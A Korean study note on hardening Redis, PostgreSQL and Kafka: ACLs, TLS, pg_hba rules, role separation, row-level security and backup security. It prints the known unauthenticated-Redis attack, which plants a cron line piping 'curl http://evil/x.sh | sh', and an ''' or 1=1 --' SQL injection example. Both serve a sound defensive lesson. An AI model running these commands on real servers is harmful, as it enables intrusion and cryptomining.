---
title: 데이터 스토어 하드닝 — Redis ACL·TLS, PostgreSQL pg_hba·역할·RLS, Kafka SASL·ACL
order: 7
level: 심화
summary: "데이터 스토어는 가장 값진 자산을 들고 있다 — 노출 면(바인딩·포트·기본 자격 증명)을 줄이는 공통 원칙, Redis 의 protected-mode·ACL(키 패턴·명령 카테고리)·명령 이름 바꾸기·TLS·대표 공격(CONFIG SET dir 로 cron 심기), PostgreSQL 의 pg_hba.conf·역할 설계(소유자/앱/읽기 전용)·행 수준 보안(RLS)·SSL·감사(pgaudit)·SQL 인젝션, Kafka 의 리스너·SASL/SCRAM·ACL·암호화, 백업 암호화와 접근 감사"
tags: [Redis ACL, protected-mode, pg_hba, 역할, RLS, pgaudit, SASL, Kafka ACL, SQL 인젝션, 암호화]
experiments: [sec-redis-acl]
---

## 공통 원칙 — 노출 면부터

| 원칙 | Redis | PostgreSQL | Kafka |
|---|---|---|---|
| 인터넷에 열지 않기 | `bind 127.0.0.1` 또는 내부망, `protected-mode yes` | `listen_addresses` 최소, 보안 그룹 | 리스너를 내부 IP 로 |
| 기본 자격 증명 제거 | `requirepass` / `user default off` | `postgres` 슈퍼유저 비밀번호, `trust` 금지 | `PLAINTEXT` 리스너 끄기 |
| 최소 권한 계정 | ACL 사용자/키 패턴/카테고리 | 역할·GRANT·RLS | ACL(토픽·그룹·동사) |
| 전송 암호화 | `tls-port` | `ssl=on`, `hostssl`, `sslmode=verify-full` | `SSL`/`SASL_SSL` 리스너 |
| 감사 | `ACL LOG`, `MONITOR`(주의) | `pgaudit`, `log_connections` | 인가 로그, 감사 토픽 |
| 패치 | 최신 안정판 | 마이너 릴리스 즉시 | 마이너 릴리스 |

이 프로젝트의 compose 는 Redis(6379)·PG(15432)·Kafka(19092) 를 전부 `127.0.0.1` 에만 바인딩한다. 그래서 학습용으로는 괜찮다. 하지만 `0.0.0.0` 으로 바꾸는 순간(예: 다른 기기에서 접속하려고) 이 노트의 모든 항목이 필요해진다.

## Redis

### 왜 Redis 가 봇의 1순위 표적인가

인증 없는 Redis 에 접속하면 **파일을 쓸 수 있다**:

```
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SET x "\n\n* * * * * curl http://evil/x.sh | sh\n\n"
SAVE
```

RDB 파일이 cron 디렉터리에 떨어지고, 잡동사니 사이의 한 줄이 cron 으로 실행된다. `authorized_keys` 에 공개키를 쓰는 변형도 있다. 2015년부터 지금까지 수만 대가 채굴 봇이 된 경로. 대응은 (1) 노출하지 않기 (2) 인증 (3) **`CONFIG`·`DEBUG`·`SAVE` 를 일반 사용자에게서 제거** (4) Redis 를 **non-root + 쓰기 불가 디렉터리**로 실행.

### 설정 체크

```conf
bind 127.0.0.1 -::1          # 또는 내부 IP
protected-mode yes           # bind 가 없고 비밀번호도 없으면 루프백 외 거부 (3.2+ 기본)
port 0                       # TLS 만 쓸 때
tls-port 6379
tls-cert-file /certs/redis.crt
tls-key-file  /certs/redis.key
tls-ca-cert-file /certs/ca.crt
tls-auth-clients yes         # mTLS: 클라이언트 인증서 요구
rename-command CONFIG ""     # 구식 방법 — ACL 이 낫다
aclfile /etc/redis/users.acl
maxmemory 1gb                # DoS: 메모리 폭주 방지
maxclients 10000
```

### ACL — 사용자·키·명령

```
ACL SETUSER app on >s3cret ~session:* ~cache:* +@read +@write +@hash +@string -@dangerous
ACL SETUSER readonly on >r0 ~* +@read -@dangerous
ACL SETUSER metrics on >m ~* +info +client|list +config|get +slowlog +latency   # exporter 용
ACL SETUSER default off                       # 기본 사용자 비활성화
ACL LIST / ACL GETUSER app / ACL CAT dangerous / ACL LOG 10
ACL SAVE                                      # aclfile 에 저장
```

- **키 패턴** `~prefix:*`: 앱별 네임스페이스 강제. 세션 서비스는 결제 키를 못 본다. `%R~` 읽기만, `%W~` 쓰기만(7.0+).
- **카테고리** `@read @write @admin @dangerous @pubsub @scripting @slow @fast …`. `-@dangerous` 는 `FLUSHALL, CONFIG, DEBUG, KEYS, SHUTDOWN, MONITOR, SAVE, CLUSTER, ACL …` 를 막는다. `+@all -@dangerous` 가 앱의 출발점.
- **명령 + 서브커맨드** `+config|get` 처럼 세밀하게. **채널** `&pattern` 으로 Pub/Sub 도 제한(7.0+ 기본 거부).
- **셀렉터**(7.0+): `(~logs:* +@read)` 로 "logs 키에는 읽기만" 같은 조합.
- 비밀번호는 `>plain` 또는 `#<sha256>`. 여러 개 등록 가능 → **무중단 회전**(새 비밀번호 추가 → 클라이언트 전환 → 옛 것 `<` 로 제거).
- `ACL LOG` 는 거부된 명령·키·인증 실패를 담는다. redis_exporter 에는 없으니 주기적으로 `ACL LOG` 길이를 메트릭으로 — 거부 급증 = 침해 신호.

실험 `sec-redis-acl` 이 이 흐름을 그대로 보여 준다. [Redis 운영 노트](/redis/notes/14-ops-commands) 와 짝.

### 그 외
- **Lua / FUNCTION**: 스크립트는 사용자의 ACL 로 실행되지만 `@scripting` 자체를 제한하라. `EVAL` 로 긴 스크립트 = DoS.
- `KEYS *`, `FLUSHALL`, `DEBUG SLEEP` 는 가용성 공격. 이 앱의 `/redis/console` 은 허용 목록이 있어야 한다(위협 모델 표).
- 복제: `masterauth`, 복제본도 같은 ACL 파일. `replica-read-only yes`.
- 스냅샷/AOF 파일 권한 0600, 디스크 암호화.

## PostgreSQL

### pg_hba.conf — 누가 어디서 어떻게

```
# TYPE  DATABASE  USER      ADDRESS         METHOD
local   all       postgres                  peer            # 로컬 OS 사용자 매핑
hostssl study     app       10.0.0.0/8      scram-sha-256   # 앱: 내부망 + SSL + SCRAM
hostssl study     readonly  10.0.0.0/8      scram-sha-256
hostssl all       all       0.0.0.0/0       reject          # 나머지 전부 거부 (순서대로 첫 매치)
# host  all       all       0.0.0.0/0       trust           # ← 절대 금지: 비밀번호 없이 전부 허용
```

- **위에서부터 첫 매치**. 넓은 규칙을 위에 두면 아래는 무의미.
- `md5` 는 구식, **`scram-sha-256`**(`password_encryption = scram-sha-256`). `trust` 는 로컬 소켓 외 금지.
- `hostssl` + `ssl=on` + 클라이언트 `sslmode=verify-full`(서버 인증서 검증, 호스트 이름 확인). `require` 만으로는 MITM 을 못 막는다. `clientcert=verify-full` 로 mTLS.
- compose 의 `POSTGRES_HOST_AUTH_METHOD` 를 `trust` 로 두는 예제가 많다 — 로컬 한정.

### 역할 설계 — 소유자·앱·읽기 전용

```sql
-- 스키마 소유자 (마이그레이션만 이 역할로)
create role study_owner nologin;
alter schema public owner to study_owner;
-- 앱 역할: DML 만, DDL 금지
create role app login password '...';
grant usage on schema public to app;
grant select, insert, update, delete on all tables in schema public to app;
alter default privileges for role study_owner in schema public grant select, insert, update, delete on tables to app;
grant usage on all sequences in schema public to app;
-- 읽기 전용 (분석·BI·도우미)
create role readonly login password '...';
grant usage on schema public to readonly;
grant select on all tables in schema public to readonly;
alter default privileges for role study_owner in schema public grant select on tables to readonly;
-- PUBLIC 의 기본 권한 회수 (PG 15 부터 public 스키마 CREATE 는 기본 회수됨)
revoke create on schema public from public;
revoke all on database study from public;
-- 접속 제한·타임아웃
alter role app connection limit 50;
alter role app set statement_timeout = '30s';
alter role readonly set default_transaction_read_only = on;
```

- 앱이 **테이블 소유자면 안 된다**: SQL 인젝션 한 번에 `drop table`. 소유자는 마이그레이션 전용.
- 슈퍼유저(`postgres`)는 사람도 앱도 평소에 쓰지 않는다. `pg_read_server_files`, `pg_execute_server_program` 같은 역할은 **파일·OS 명령 실행** 권한 — 절대 앱에.
- `SECURITY DEFINER` 함수는 setuid 와 같다 — `search_path` 를 고정하지 않으면 권한 상승 경로.

### 행 수준 보안(RLS) — 인가를 DB 가 강제

```sql
alter table orders enable row level security;
alter table orders force row level security;    -- 소유자에게도 적용
create policy orders_owner on orders
  using (user_id = current_setting('app.user_id')::int)          -- SELECT/UPDATE/DELETE 가시성
  with check (user_id = current_setting('app.user_id')::int);    -- INSERT/UPDATE 결과 검증
-- 앱: 트랜잭션마다
set local app.user_id = '42';
select * from orders;            -- user 42 의 행만. 코드가 where 를 빼먹어도 안전
```

- IDOR 를 **구조적으로** 막는다 — [03 노트](/security/notes/03-authn-authz) 의 "객체 수준 인가" 를 DB 에서.
- 멀티테넌트 SaaS 의 표준(`tenant_id`). 성능: 정책 조건에 인덱스, `EXPLAIN` 으로 확인 — [PG 인덱스 노트](/postgres/notes/02-indexes-explain).
- `BYPASSRLS` 역할(관리자)·슈퍼유저는 우회한다. 커넥션 풀(PgBouncer transaction 모드)에서는 `set local` 이 트랜잭션 안에 있어야 한다.

### SQL 인젝션 — 아직도 1위권

```ts
// 취약
await pg.query(`select * from notes where slug = '${slug}'`);     // slug = "' or 1=1 --"
// 안전: 파라미터 바인딩 (값은 절대 SQL 로 해석되지 않음)
await pg.query("select * from notes where slug = $1", [slug]);
// 식별자(테이블·컬럼 이름)는 바인딩 불가 → 허용 목록 + quote_ident
```

- ORM 도 `raw()`·문자열 보간에서 뚫린다. LIKE 의 `%`·`_` 이스케이프, `order by ${col}` 허용 목록.
- 2차 방어: 앱 역할의 권한 최소화(위), `statement_timeout`, 에러 메시지에 SQL 노출 금지, pgaudit 로 이상 쿼리 탐지, WAF.
- [PG 쿼리 노트](/postgres/notes/07-query-optimization-deep) 의 `pg_stat_statements` 는 보안에도 쓸모 — 처음 보는 쿼리 지문이 갑자기 나타나면 조사.

### 감사와 암호화
- `log_connections`, `log_disconnections`, `log_statement = 'ddl'`(전부 찍으면 성능·비밀 유출), **pgaudit** 확장으로 `READ/WRITE/DDL/ROLE` 클래스별 감사 → Loki.
- 저장 암호화: 디스크/볼륨 암호화(클라우드 기본), 컬럼 암호화는 `pgcrypto` 또는 앱에서(키는 KMS). 백업 덤프도 암호화·접근 제한 — 덤프 하나가 DB 전체다.
- 확장은 최소로: `plpython`, `file_fdw`, `dblink` 는 OS/네트워크 접근.

## Kafka

### 리스너와 인증
```properties
listeners=INTERNAL://0.0.0.0:9092,EXTERNAL://0.0.0.0:9094
listener.security.protocol.map=INTERNAL:SASL_SSL,EXTERNAL:SASL_SSL,CONTROLLER:SSL
sasl.enabled.mechanisms=SCRAM-SHA-512          # 또는 OAUTHBEARER(OIDC), mTLS(ssl.client.auth=required)
ssl.keystore.location=/certs/broker.p12
authorizer.class.name=org.apache.kafka.metadata.authorizer.StandardAuthorizer   # KRaft
allow.everyone.if.no.acl.found=false            # ACL 없으면 거부
super.users=User:admin
```
- 이 프로젝트의 KRaft 브로커는 `PLAINTEXT` 다(로컬). 운영은 **SASL_SSL** 이 기본.
- SCRAM 자격 증명은 KRaft 메타데이터에 저장(`kafka-configs --alter --add-config 'SCRAM-SHA-512=[password=...]' --entity-type users --entity-name app`).

### ACL — 토픽·그룹·동사
```bash
kafka-acls --bootstrap-server ... --add --allow-principal User:orders-svc \
  --operation Write --topic orders
kafka-acls --add --allow-principal User:billing-svc \
  --operation Read --topic orders --group billing          # 읽기엔 그룹 권한도 필요
kafka-acls --add --allow-principal User:connect --operation Create --operation Write --topic 'outbox.' --resource-pattern-type prefixed
kafka-acls --list --topic orders
```
- 프로듀서: `Write` + `Describe` 토픽. 컨슈머: `Read` 토픽 + `Read` 그룹. 트랜잭션: `Write` on TransactionalId.
- 접두사 패턴으로 팀별 네임스페이스(`team-a.*`). `CREATE` 는 운영만 — 토픽 자동 생성 끄기(`auto.create.topics.enable=false`).
- Debezium/Connect 워커의 자격 증명이 내부 토픽(`_connect_configs`) 에 평문으로 저장될 수 있다 → `config.providers` 로 외부화 — [CDC 노트](/kafka/notes/08-cdc-outbox-debezium).
- 메시지 본문 암호화는 Kafka 가 하지 않는다(디스크 암호화 + 필요 시 앱 레벨 필드 암호화).
- 감사: 인가 실패 로그(`kafka.authorizer.logger`) → Loki 알림, Schema Registry 도 인증·ACL.

## 백업과 복구의 보안

- 백업은 **DB 전체의 사본**이다. 암호화(저장·전송), 접근 권한은 DB 보다 엄격히, 불변 저장소(객체 잠금)로 랜섬웨어 대비.
- 복구 테스트를 주기적으로 — 복구 안 되는 백업은 없는 백업. [카오스](/chaos/notes/01-chaos-principles) 의 "연습" 과 같은 논리.
- 백업에서 PII 를 지우거나 마스킹한 **개발용 덤프** 를 따로. 운영 덤프를 노트북에 두지 않기.

## 예시로 보기 — 이 프로젝트에서

| 스토어 | 지금 | 노출 시 필요한 것 |
|---|---|---|
| Redis (compose, `protected-mode no`, 비밀번호 없음, root) | 127.0.0.1 전용 | `aclfile` 로 `app`/`readonly`/`metrics` 사용자, `default off`, `user: 999`, `maxmemory`, TLS |
| Redis (k8s StatefulSet) | 클러스터 내부 | ACL Secret 마운트, NetworkPolicy(web 만), `requirepass` 를 Secret 으로 |
| PostgreSQL (`study/study`, 슈퍼유저) | 127.0.0.1 | 앱은 `app` 역할, 소유자 분리, `hostssl` + SCRAM, pgaudit, RLS(진행률 테이블을 PG 로 옮긴다면) |
| Kafka (PLAINTEXT) | 127.0.0.1 | SASL_SSL + SCRAM, ACL, `allow.everyone.if.no.acl.found=false` |
| Grafana/Prometheus | 익명 Admin | OIDC, 데이터소스 권한, Prometheus 는 reverse proxy 뒤 |

실험 `sec-redis-acl` 을 돌려 보면 `default` 사용자가 `nopass` 라는 메모가 뜬다 — 그게 "지금" 열인 이유다.

## 실습 체크리스트

- [ ] 실험 `sec-redis-acl` 로 키 패턴·카테고리 제한과 `ACL LOG` 확인
- [ ] `redis-cli ACL CAT dangerous` 목록을 읽고 각 명령이 왜 위험한지 한 줄씩 적기
- [ ] compose Redis 에 `aclfile` 을 붙이고 앱(ioredis `username/password`)을 `app` 사용자로 연결
- [ ] PostgreSQL 에 `app`/`readonly` 역할을 만들고 앱 연결 문자열을 바꾼 뒤 실험 7개가 전부 통과하는지(권한 부족이 어디서 나는지)
- [ ] `orders` 테이블에 RLS 를 걸고 `set local app.user_id` 유무로 결과가 달라지는지 확인
- [ ] `pg_hba.conf` 의 `trust` 줄을 찾아 `scram-sha-256` 으로 바꾸고 재접속
- [ ] Kafka 를 SASL_SSL 리스너로 바꿔 kafkajs 에 `sasl: { mechanism: 'scram-sha-512' }` 로 연결, ACL 없이 Read 가 거부되는지
